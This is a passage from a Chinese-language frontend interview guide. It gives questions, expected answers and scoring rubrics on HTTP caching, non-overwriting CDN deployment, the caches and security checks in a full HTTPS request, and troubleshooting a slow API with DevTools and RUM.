**高级**：在中级基础上，能深入：

- **非覆盖式发布（Non-overwriting Deployment）**：核心原则——永远不要用相同 URL 覆盖已部署的文件。因为 CDN 节点和用户浏览器缓存中的旧版本无法被强制清除。做法：(1) 每次构建生成带内容 hash 的文件名（`app.a1b2c3d4.js`）；(2) 部署时新文件和旧文件同时存在于服务器（不是覆盖，是增加）；(3) HTML 指向新文件名；(4) 旧文件保留一段时间（至少一个 max-age 周期）确保还在缓存有效期内的用户不会请求到 404。这也是为什么 CDN 上通常不设置清除缓存的 API——不需要，因为新旧 URL 同时存在。

- **发布顺序（关键）**：(1) 先部署静态资源（JS/CSS/图片）到 CDN——确保新 hash 名的文件都已在 CDN 上可访问；(2) 再部署 HTML——确保 HTML 引用的所有资源已经就位。如果顺序反了（先部署 HTML），用户拿到的 HTML 引用了新的 JS 文件名，但 CDN 上还没有，结果是 JS 请求 404 -> 页面白屏或功能缺失。这个发布顺序的常识是区分"做过部署"和"只在本地开发"的重要信号。

- **缓存策略与 CDN 的层级关系**：浏览器缓存 -> CDN 缓存 -> 源站。CDN 的缓存由 `Cache-Control` 的 `s-maxage`（覆盖 max-age 对 CDN 的行为）或 Surrogate-Control 头控制。通常会设置 CDN 缓存时间比浏览器短一些——CDN 是共享的，缓存更新更频繁避免多个用户都拿到旧版本。URL 参数刷新（`app.js?v=2`）不建议——CDN 可能会忽略 query string，不同 CDN 行为不一致，不如文件名 hash 可靠。

- **Service Worker 缓存**：SW 缓存是比 HTTP 缓存更上层的缓存，可以完全自定义缓存策略（"缓存优先"、"网络优先"、"缓存+网络竞速"）。对 PWA 应用，SW 缓存可以做到离线可用。但需要注意 SW 的更新机制——通常策略是 SW 缓存 JS/CSS/字体等"壳"资源（App Shell），API 数据走网络优先。

#### 评分标准

| 级别 | 标准 |
|------|------|
| 初级 | 知道 HTML 不缓存、JS/CSS 加 hash 可以长缓存，但对各资源类型的差异化策略说不完整，对 immutable 不了解 |
| 中级 | 能给出完整的资源缓存策略表（HTML no-cache / JS/CSS immutable / 图片 max-age+Etag / API 不缓存），能解释 HTML 不强缓存的原因（发版后引用新文件名导致 404 白屏），知道非覆盖式发布的概念 |
| 高级 | 在中级基础上，能给出正确的发布顺序（先部署静态资源再部署 HTML），能解释非覆盖式发布与 CDN 的配合（新旧文件同时存在），了解 s-maxage 控制 CDN 缓存行为，能对比文件名 hash vs URL 参数刷新的优劣，了解 Service Worker 缓存与 HTTP 缓存的层级配合 |

#### 追问方向

**追问1**："为什么 HTML 不设强缓存？如果用户已经拿到了旧 HTML 会怎样？你遇到过这种情况吗？"

> 预期回答：如果 HTML 设了强缓存（如 max-age=3600），发版后一个小时内用户刷新页面时，浏览器直接使用本地缓存的旧 HTML——旧 HTML 里引用的是旧 hash 的 JS/CSS 文件（如 `app.oldhash.js`），这些旧文件在服务器上已经被清理掉了 -> 浏览器尝试加载 `app.oldhash.js` -> 返回 404 -> 页面白屏。所以 HTML 必须设为 `no-cache`——每次刷新都发送条件请求去服务器验证 HTML 是否更新：如果服务器返回 304 -> 使用缓存中的旧 HTML，加载旧的 JS/CSS（旧文件仍在服务器上，因为是非覆盖式发布）；如果服务器返回 200 -> 获取新 HTML，加载新的 JS/CSS（文件名变了，是全新的请求，不走缓存）。这是一个典型的"缓存失效雪崩"场景——一个关键资源（HTML）的缓存过期失败，导致所有依赖链路都出了问题。

**追问2**："CDN 上缓存了一个旧文件，怎么让它立即更新？还是说不需要更新？"

> 预期回答：如果遵循了"非覆盖式发布 + 文件名 hash"的策略，根本不需要更新 CDN 上的旧文件——HTML 引用的是新 hash 的文件名，对 CDN 而言这是一个全新的 URL，不会命中任何旧缓存。需要清除 CDN 缓存的情况往往是：发布时覆盖了同名文件（如没改 hash），或者 HTML 本身也需要在 CDN 上刷新。CDN 刷新的常用方式：(1) CDN 管理后台提交 URL 刷新（purge），由 CDN 通知各边缘节点删除对应缓存；(2) 通过 API 自动化刷新，集成到 CI/CD 发布流程中。但更好的做法是：避免使用需要刷新的发布方式——给所有静态资源加内容 hash，发布就等同于"新增"，不需要推翻旧缓存。

**追问3**："API 请求的缓存怎么做？GET 请求能用强缓存吗？什么场景下可以，什么场景下不行？"

> 预期回答：API 缓存比静态资源复杂，取决于数据的"实时性要求"和"变更频率"。可以用强缓存的场景：(1) 字典数据（省市区列表、行业分类）——数据几乎不变，可以设 max-age=604800（一周）+ immutable；(2) 配置项/白名单——定期更新，可以设 max-age=600（10 分钟）。必须用协商缓存或不能缓存的场景：(1) 用户相关数据（订单列表、个人信息）——必须 no-cache，每次去服务器验证；(2) 实时数据（股票价格、竞价排行）——no-store，不能缓存。API 缓存的一个特殊风险：即使是"字典数据"，如果一套 API 被多个租户共用，缓存可能导致租户之间的数据泄露（A 租户的字典查到了 B 租户的缓存）。所以 CDN 缓存的 API 通常设置 `Cache-Control: private`（只允许浏览器缓存，不允许 CDN 缓存），或者在 CDN 层按租户做缓存 key 区分。

#### 过渡语

> 面试官：缓存策略设计讲得很系统。现在我们进入最后的综合环节——把前面讲的网络、安全、缓存串成一条完整的链路。

## 六、第四阶段：综合追问（37-43 min，2 题）

### Q9：一次完整的 HTTPS 请求中涉及了多少种缓存和校验？（37-40 min）

#### 面试官话术

> 面试官：把前面讲的串起来——用户访问一个全新的 HTTPS 网站（如 `https://example.com`），从在地址栏输入 URL 到页面完全渲染完成，这个过程中涉及了哪些缓存、哪些安全校验？请你按时间顺序走一遍。

#### 面试官内心 OS

这是整场面试的"集大成"题——用来验证候选人能不能把网络、安全、缓存这三块串成一个完整的 mental model。这道题对初级候选人不强求——能说出一半就很好了。对中高级候选人，重点看：(1) 时间顺序是否合理——从 DNS 到 TCP 到 TLS 到 HTTP 到缓存到渲染，每一步在什么位置；(2) 安全检查是否覆盖到位——TLS 证书验证、同源策略、CSP、Mixed Content、HSTS；(3) 缓存检查是否提到正确的位置——浏览器缓存在 HTTP 请求发出去之前就检查了，不是"收到响应后才检查"；(4) 能不能主动提到容易被忽略的点——DNS 缓存、HSTS Preload List、TCP 连接复用、TLS Session Resumption。

这道题标准答案至少涉及 10-15 个环节，如果候选人能主动从"输入 URL 到页面渲染"的完整链路来组织回答且不漏掉关键环节，说明对网络和浏览器的工作原理已经有了系统性的认知，这是 S 级候选人的信号。

#### 考点

- 完整链路的时序组织能力
- 各环节的缓存机制识别（DNS 缓存、浏览器缓存、CDN 缓存）
- 各环节的安全校验识别（TLS 证书、CSP、Mixed Content、HSTS）
- 从"点"到"链"的知识串联能力

#### 预期回答

**初级**（说出 5-7 个环节）：DNS 解析 -> TCP 连接 -> TLS 握手 -> HTTPS 请求 -> 服务器返回 HTML -> 解析 HTML 中引用的 JS/CSS -> 分别请求 -> 页面渲染。中间提到了浏览器缓存检查和证书验证即可。

**中级**（说出 8-12 个环节，有序且关键环节正确）：

按时间顺序的完整链路：

1. **HSTS Preload List 检查**（安全）：浏览器检查目标域名是否在内置的 HSTS Preload List 中——如果是，强制用 HTTPS 发起请求，拒绝任何 HTTP 降级（预防 SSL 剥离）。
2. **DNS 解析 + DNS 缓存**（缓存）：浏览器 DNS 缓存 -> OS hosts 文件 -> OS DNS 缓存 -> 路由器缓存 -> ISP DNS 服务器（递归查询到权威 DNS）。DNS 查询结果是 IP 地址，有 TTL 指定的缓存时间。
3. **TCP 三次握手**（连接）：SYN -> SYN-ACK -> ACK。如果之前连接未超时且支持 keep-alive，可能复用已有 TCP 连接跳过握手（TCP Fast Open 可以进一步优化为 0-RTT）。
4. **TLS 握手 + 证书链校验**（安全）：TLS 1.2（2-RTT）/ 1.3（1-RTT）。核心安全检查：(1) 验证证书链（受信任 CA -> 中间 CA -> 服务器证书）——逐级验证签名、有效期、吊销状态；(2) 验证域名匹配（SAN/CN）；(3) ECDHE 密钥交换（保证前向安全性）。
5. **HTTP 请求 + 浏览器缓存检查**（缓存）：浏览器在发 HTTP 请求前，先检查本地缓存——强缓存命中直接返回 200 (from disk/memory cache)，不发送请求。强缓存未命中或过期，发送请求，带上条件请求头（If-None-Match/If-Modified-Since）进入协商缓存流程。服务器返回 304 或 200 + 资源。
6. **HTML 解析 + 子资源加载**：浏览器收到 HTML 后解析 DOM，遇到 `<link>`/`<script>`/`<img>` 等外部资源标签时，对每个资源重复步骤 4-5（TLS 复用已有连接，缓存检查各自独立）。
7. **CSP 检查**（安全）：浏览器根据 HTML 响应中的 `Content-Security-Policy` 头或 `<meta http-equiv="Content-Security-Policy">` 标签，检查每个脚本/样式/图片的加载来源是否在白名单内——不符合的请求被阻止，同时在 Console 输出 CSP 违规报告。
8. **Mixed Content 检查**（安全）：如果 HTML 是 HTTPS 加载的，但其中引用了 HTTP 资源（如图片、脚本），浏览器会阻止"混合内容"——被动混合内容（图片、视频）可能默认允许但显示警告，主动混合内容（脚本、CSS、iframe）被完全阻止。
9. **Cookie 携带**（安全 + 缓存）：对每个同源请求自动带 Cookie（受 SameSite 策略控制），跨域请求需要 `credentials: 'include'` + 服务器 `Access-Control-Allow-Credentials`。
10. **CDN 缓存层**（缓存）：静态资源可能经过 CDN -> CDN 节点如果已有缓存（根据 `s-maxage`/`max-age`），直接返回给浏览器，不需要回源。
11. **Service Worker（如已注册）**（缓存）：如果页面注册了 SW，网络请求会被 SW 的 `fetch` 事件拦截，由 SW 自定义缓存策略（Cache First / Network First 等）决定是返回缓存还是发网络请求。

**高级**（补充容易被忽略的深度环节）：

12. **TCP 连接复用**（缓存）：浏览器维护连接池，同源请求复用已有 TCP 连接（HTTP1.1 keep-alive）或 HTTP2 的单连接多路复用。连接池大小受浏览器限制（HTTP1.1 同源 6 个，HTTP2 同源 1 个），超过限制的请求排队等待。
13. **TLS Session Resumption**（缓存）：TLS 握手后，浏览器和服务器可以缓存会话信息（Session ID 或 Session Ticket），下次连接同一服务器时可以跳过完整的 TLS 握手（简化握手，1-RTT 或 0-RTT）。
14. **页面渲染中的安全检查**：DOM 解析时遇到 `javascript:` URL（如 `<a href="javascript:alert(1)">`）执行 JS——某些 CSP 策略可以限制；`<iframe>` 的沙箱模式（sandbox 属性）限制 iframe 内的脚本执行、表单提交、弹窗等行为。
15. **HTML 缓存策略的特殊性**：HTML 必须是 `no-cache`——如果被强缓存，发版后用户仍然拿到旧 HTML，引用的是旧 hash 的 JS/CSS 文件，如果旧文件已被清理 -> 404 白屏。这是整个缓存链条的"关键点"。

#### 评分标准

| 级别 | 标准 |
|------|------|
| 初级 | 能按正确的时间顺序说出 5-7 个核心环节（DNS -> TCP -> TLS -> HTTP -> 缓存 -> 渲染），知道 DNS 有缓存、TLS 有证书校验、浏览器有缓存，但环节间衔接不够流畅，遗漏较多细节 |
| 中级 | 能按时间顺序说出 8-12 个环节并解释每个环节的作用，覆盖到 HSTS/DNS 缓存/TCP 握手/TLS 证书校验/浏览器缓存（强+协商）/CSP/Mixed Content，能说清楚哪些环节是"安全"哪些是"缓存"且不混淆 |
| 高级 | 能完整梳理 12+ 个环节，补充 TCP 连接复用、TLS Session Resumption、Service Worker 缓存、CDN 缓存层级、HTML 缓存策略对全链路的"关键点"影响等深度内容，能从"攻击者的视角"分析每个安全环节如果被绕过会有什么后果——这是 S 级候选人的标志 |

#### 追问方向

**追问**："如果用户是第二次访问同一个网站，哪些步骤可以跳过？"

> 预期回答：第二次访问可以复用的缓存和会话：(1) HSTS Preload List 仍在有效期内，不需要重新判断是否用 HTTPS；(2) DNS 缓存可能命中——浏览器 DNS 缓存和 OS DNS 缓存在 TTL 内直接返回 IP；(3) TCP 连接如果还在 keep-alive 时间内可能复用，不需要三次握手；(4) TLS Session Resumption（Session ID/Ticket）可跳过完整握手，1-RTT 或 0-RTT；(5) 浏览器强缓存如果命中——HTML 设为 no-cache 通常需要发条件请求 304，但 JS/CSS/图片可能直接 from cache；(6) 子域名/主域名之前建立的 TCP+TLS 连接可以复用；(7) Service Worker 缓存（如已注册）命中直接返回，可能完全绕过网络；(8) CDN 边缘节点还有缓存，不需要回源。这就是为什么第二次访问一个网站比第一次快得多——首屏时间从秒级降到毫秒级。追问"那这些缓存各自的有效期是多长？"可以深入考察对 TTL 分配的理解。

#### 过渡语

> 面试官：链路串得很完整。最后我们来看一个更贴近日常工作的实际场景——线上问题排查。

### Q10：开放方案题——某个 API 响应太慢怎么排查？（40-43 min）

#### 面试官话术

> 面试官：用户反馈某个页面加载很慢，前端 Leader 怀疑是某个 API 接口慢导致的，让你来排查。你会怎么做？请从排查思路和优化方案两方面来回答。

#### 面试官内心 OS

这道题考察工程能力和问题排查的系统性思维——而不仅仅是"看看 DevTools Network 面板"。重点看候选人排查问题时是否有"分层排查"的思路：(1) 先确认是不是真的是后端慢——Waiting (TTFB) 长 = 后端慢 + 网络延迟，Download 长 = 数据量大；(2) 从单点问题到系统问题——是一个用户慢还是所有用户慢？是一台服务器慢还是所有服务器慢？是今天慢还是一直慢？(3) 从现象到根因——如果是后端慢，是哪个环节慢？DB 查询？RPC 调用？代码逻辑？如果是网络延迟，是 DNS 慢还是连接建立慢还是传输慢？

回答时看候选人是否知道 Timing 面板中各段水的含义——Queueing、Stalled、DNS Lookup、Initial Connection、SSL、Request Sent、Waiting (TTFB)、Content Download——每段代表什么，哪段长说明什么问题。能准确说出这些的，说明真正用过 DevTools 排查过网络问题。

#### 考点

- DevTools Network 面板完整解读（Timing 各段含义）
- 分层排查思路（前端 -> 网络 -> 服务端 -> 数据库）
- 性能监控体系（APM/RUM/Performance API）
- 常见优化方案及其适用场景

#### 预期回答

**初级**：打开 DevTools Network 面板 -> 找到慢的接口 -> 看 Time 列 -> 告诉后端同事这个接口慢，让他们优化。能说出"如果数据量大可以考虑分页"。

**中级**：能给出结构化的排查和优化方案：

**第一步：前端排查（确认问题范围）**

- DevTools Network 面板，按 Time 排序，找到耗时最长的请求。
- 点击请求看 Timing 细分：
  - **Queueing + Stalled**：请求在浏览器队列中等候。原因：同源并发限制（HTTP1.1 6 个）或更高优先级的请求在排队。优化：减少同源请求数、用 HTTP2。
  - **DNS Lookup + Initial Connection + SSL**：建连耗时。首次连接需要完整的 DNS+TCP+TLS，后续可复用。优化：`<link rel="preconnect">` 提前建连、使用 CDN 减少网络距离。
  - **Request Sent**：请求发送耗时。通常很小，除非是大文件上传。优化：压缩上传内容。
  - **Waiting (TTFB - Time To First Byte)**：从请求发送到收到响应第一个字节的时间。这是后端处理时间 + 网络传输延迟。TTFB 长 = 后端处理慢或网络延迟大。这是排查的核心指标。
  - **Content Download**：接收响应内容的时间。长 = 数据量大或网络带宽小。优化：分页、字段裁剪、gzip/brotli 压缩。
- 如果 TTFB 长，多刷新几次确认是否稳定出现——如果间歇性出现，说明后端有偶发慢操作或资源争用；如果每次都慢，说明是系统性问题。
- 用 `navigator.sendBeacon` 或 Performance API 收集客户端的真实网络耗时（RUM - Real User Monitoring），区分是地域问题（某个地区 CDN 节点慢）还是全局问题。

**第二步：后端排查（如果有权限）**

- 查看后端日志中该接口的请求处理时间（access log 中的 response time），对比前端 TTFB——差值就是网络延迟。
- 如果确实是后端慢，进一步定位：数据库慢查询（慢查询日志）、外部 API 超时、代码逻辑效率（CPU profile）、内存压力（GC 频繁）。
- APM 工具（如 Sentry Performance、Datadog、SkyWalking）可以在一次请求的全链路追踪中看到每个下游调用的耗时占比，快速定位瓶颈。

**第三步：优化方案（根据瓶颈环节选择）**

- **Waiting (TTFB) 长**：后端优化（查询加索引、缓存高频数据、异步处理非关键逻辑）。
- **Content Download 长**：数据量优化（分页、字段裁剪让客户端指定需要返回的字段、gzip/brotli 压缩——brotli 比 gzip 压缩率更高但压缩速度更慢，适合静态资源；gzip 适合动态 API 响应）。
- **建连耗时高**：DNS Prefetch（`<link rel="dns-prefetch">`）、Preconnect（`<link rel="preconnect">`）、HTTP2 单连接减少重复建连。
- **并发过多**：HTTP2 多路复用、合并请求（如果多个 API 总是同时调用，考虑 BFF 层聚合）。
- **缓存**：对于不常变化的数据（字典、配置），加上缓存头（`Cache-Control: max-age=600`）或 Service Worker 缓存甚至客户端内存缓存。

**高级**：在中级基础上，能深入：

- **RUM（Real User Monitoring）体系搭建**：前端不只是用 DevTools 看到自己的请求，应该在代码里集成 Performance API（`performance.getEntriesByType('resource')`）来收集所有用户的真实网络耗时数据。结合 `navigator.connection.effectiveType`（用户网络类型：4g/3g/2g）做分层分析。数据上报到分析平台后，可以看到 p50/p90/p99 的 TTFB 和数据传输时间——识别出是特定机型/地域/网络环境的用户慢，还是全局都慢。这是前端工程师从"关注页面性能"到"关注用户体验数据"的进阶。

- **请求的完整 Timing 拆解计算**：以代码 `performance.getEntriesByType('resource')` 返回的 PerformanceResourceTiming 为例，每段的计算方式：
  - DNS Lookup = domainLookupEnd - domainLookupStart
  - TCP = connectEnd - connectStart
  - TLS = (secureConnectionStart > 0) ? connectEnd - secureConnectionStart : 0
  - Request = responseStart - requestStart
  - TTFB = responseStart - requestStart（和 Request 一致，因为 Request Sent 几乎为 0）
  - Download = responseEnd - responseStart

- **前后端协作优化——BFF 模式**：对于移动端或性能敏感的场景，BFF（Backend For Frontend）层可以聚合多个后端 API 为一个前端专用的接口，减少客户端请求数、减少无关数据字段、在服务端做数据拼接和格式转换。

- **竞速和降级**：如果某个 API 确实无法在合理时间内返回，前端可以做：(1) 超时降级——Promise.race 设置 5 秒超时，超时后用本地缓存数据或默认值兜底；(2) RequestIdleCallback/reporting observer——使用低优先级发送非关键请求；(3) 骨架屏/渐进式加载——页面先展示骨架，数据到了再填充。

#### 评分标准

| 级别 | 标准 |
|------|------|
| 初级 | 能用 DevTools Network 找到慢接口，知道看 Time 和 TTFB，能给出分页或压缩的基础优化建议，但对 Timing 各段含义解释不清，排查思路比较单薄 |
| 中级 | 能详细解读 Timing 各段（Queueing/DNS/TCP/SSL/Waiting/Download）的含义和优化方向，能区分前端/网络/后端三层分别如何排查，能给出 4+ 种优化方案并根据 TTFB 长还是 Download 长来选择合适的方案 |
| 高级 | 在中级基础上，能用 Performance API 构建 RUM 监控体系（分析 p50/p90/p99），了解 APM 全链路追踪原理，能给出 BFF 聚合/超时降级/渐进式加载等系统性方案，能用 performance.getEntriesByType('resource') 编程化地分析资源耗时 |

#### 追问方向

**追问**："如果 TTFB 正常但 Download 很长，可能是什么原因？怎么优化？"

> 预期回答：TTFB 正常说明后端处理 + 网络延迟没问题，问题在数据传输阶段。原因分析：(1) 响应数据量太大——可能返回了几千条记录、包含了不需要的关联字段；(2) 网络带宽低——用户处于弱网环境（2G/3G）；(3) 压缩未开启——响应没有 gzip/brotli 压缩。优化方案：(1) 分页——一次只返回 20-50 条，用户滚动加载更多；(2) 字段裁剪——让客户端指定需要的字段（如 GraphQL 或 REST API 的 `?fields=id,name,avatar`），减少无用字段的传输；(3) 数据压缩——开启 gzip（Nginx `gzip on`）或 brotli（`brotli on`）。JSON 的压缩率通常在 80%+，效果非常显著；(4) 使用更高效的数据格式——如 Protobuf（比 JSON 体积小 3-10 倍，但人类不可读，适合同一团队的内部通信）；(5) 对流式数据用 SSE（Server-Sent Events）逐条推送——不需要等所有数据生成完毕后再返回（如实时日志）。

### 面试官话术

### 推荐的反问问题

**推荐问题1：团队的技术基础设施**

> 候选人：想了解一下团队在网络安全方面的技术基础设施怎么样？比如 CORS 策略、CSP 策略、HTTPS 证书管理这些，是前端负责配置还是专门的运维/SRE 团队在管？CDN 和缓存策略是前端自己制定还是有统一的规范？

> 面试官预期回答：
> "这个问得挺细的。证书和 CDN 有运维团队统一管理，但缓存策略、CSP 策略是前端团队自己把控的——因为只有前端最清楚资源的变更频率和加载依赖。HTTPS 是全站强制加密，CORS 白名单由后台维护，前端如果需要新增跨域域名需要提申请。内部有统一的静态资源部署规范——所有文件带内容 hash，我们很早就迁移到非覆盖式发布了，所以 CDN 缓存基本不需要手动清理。你对这方面有经验的话，进来后可以在这个方向上发挥更大作用。"

**推荐问题2：安全相关的开发流程**

> 候选人：团队在日常开发中对 XSS/CSRF 防御有什么规范的流程吗？比如 Code Review 中会不会特别关注 `innerHTML` 和 `v-html` 的使用？有没有安全测试环节？

> 面试官预期回答：
> "我们有 ESLint 规则禁止直接使用 `innerHTML` 和 `v-html`，必须用 `// eslint-disable-next-line` 注释并说明原因才能绕过。CSP 策略在 Report-Only 模式下跑了三个月，确认无误后才切为 enforce 模式。上线前不需要专门的安全测试——因为我们在大仓里集成了 SonarQube，它能在 PR 阶段就标出潜在的 XSS 和注入风险。不过工具能发现的是编码层面的问题，业务逻辑的安全（如权限校验、CSRF Token 管理）还是靠 CR。如果候选人提到渗透测试经验，可以追问——我们每半年有一次第三方渗透测试，前端也可以参与学习。"

**推荐问题3：性能优化和缓存策略**

> 候选人：团队在缓存策略上有没有统一的规范？比如不同的资源类型的 Cache-Control 配置是写在部署脚本里还是每个项目各自维护？有没有监控线上缓存命中率的工具？

> 面试官预期回答：
> "缓存规范有统一基准——HTML 必须 no-cache，带 hash 的 JS/CSS 设 immutable，图片 max-age=86400——这些配置写在了统一的 Nginx 模板里，新项目直接继承，不需要每个项目自己配。如果个别资源有特殊需求可以覆盖。线上缓存命中率主要看 CDN 的监控面板——我们用的 CDN 服务商会显示命中率、回源率、流量分布，包括按域名、按路径的细分。前端同学日常主要关注的是发版后用户是否第一时间拿到了新版本，我们通过埋点监控 HTML 文件的版本号分布来判断——如果发版 5 分钟后还有 10% 的用户在用旧版本，那说明缓存策略可能有问题。"

**推荐问题4：网络相关的工程挑战**

> 候选人：团队目前在网络方面有没有遇到过比较有挑战性的问题？比如跨域架构、CDN 部署方案、或者某个性能瓶颈跟网络有关？

> 面试官预期回答：
> （关注技术挑战而非日常琐事，体现候选人对成长空间的关注）"最近最大的挑战是多域名迁移——原来的静态资源分散在 3 个域名上，历史原因是 HTTP1.1 时代的域名分片策略。现在我们计划统一到一个域名下，利用 HTTP2 的单连接多路复用。但这个迁移涉及大量的构建配置改造、CORS 策略调整、CDN 回源规则重配，而且必须灰度——不能一下子切。目前正在做第一期：先在灰度环境用 `<link rel="preconnect">` 预热新域名的 TCP+TLS 连接，等数据确认新域名 CDN 覆盖率没问题再正式切。如果你对这类系统层面的网络优化感兴趣，这个项目会非常有挑战性。"

**推荐问题5：面试流程和后续安排**

> 候选人：后续的面试流程大概是怎样的？大概多久能有反馈？

> 面试官预期回答：

- 缓存部分（Q7-Q8，权重 20%）是最容易拉开差距的模块——理论大家都会背，但实战中做过分层部署和非覆盖式发布的候选人一眼就能认出来。如果候选人主动提到"先部署静态资源再部署 HTML"这种发布顺序，可以列为缓存部分的加分项。
- Q9（完整链路串联，权重 10%）是判定 S 级候选人的关键题。如果一个候选人在 Q2/Q3/Q4/Q5/Q7 各题中表现中等，但能把它们全部串起来形成完整的 mental model，说明知识的组织方式是系统式的而非碎片式的——这种候选人的成长曲线会更陡。
- Q10（排查题，权重 5%）考察的是工程思维和方法论。如果候选人能给出"先定位前端还是后端 -> 还原生产环境 vs 本地复现 -> 分层排查 -> 根本原因修复而非暴力规避"的完整排查链路，即使手写代码能力一般也能加分——因为这种思维方式在实际项目中远比手写一个深拷贝重要。
- 如果候选人对于某个问题回答得特别深入（明显超出了题目本身的要求），应记录下来——这可能是高潜力的信号，可以在二面中进一步验证。例如：主动提到 QUIC 的连接迁移、知道 Certificate Transparency、能说出 brotli 和 gzip 在不同数据量下的压缩率差异曲线。

## 时间控制提示

| 阶段 | 时间 | 注意 |
|------|------|------|
| 第一阶段：HTTP 基础 | 3-15 min | Q3（HTTP 版本演进）容易展开太久——如果有跑偏到 QUIC 协议细节的趋势，适时拉回来。控制追问深度，单个追问不超过 3 分钟 |
| 第二阶段：浏览器安全 | 15-27 min | XSS 和 CSRF 是必考点——如果候选人答得好可以压缩 Q5 的时间，留时间给缓存。Q6（同源策略）容易滑向"罗列方案"而不是"深入原理"，有意识追问"为什么 script 标签能跨域"这种 design trade-off 问题 |
| 第三阶段：浏览器缓存 | 27-37 min | Q8（策略设计）是区分度最高的题——如果时间紧可以压缩 Q7 的追问，优先保证 Q8 有 5 分钟以上。这是知道候选人在真实项目中"做过没"的最可靠信号 |
| 第四阶段：综合追问 | 37-43 min | Q9 对初级候选人最多花 2-3 分钟——能说出 5-6 个环节即可，不强求完整链路。中高级候选人可以追问子环节（TCP 连接复用、TLS Session Resumption）看深度 |
| 反问环节 | 43-45 min | 控制 2 分钟，如果候选人问题多可以适当延长到 3 分钟。结束后立即填写评分表 |
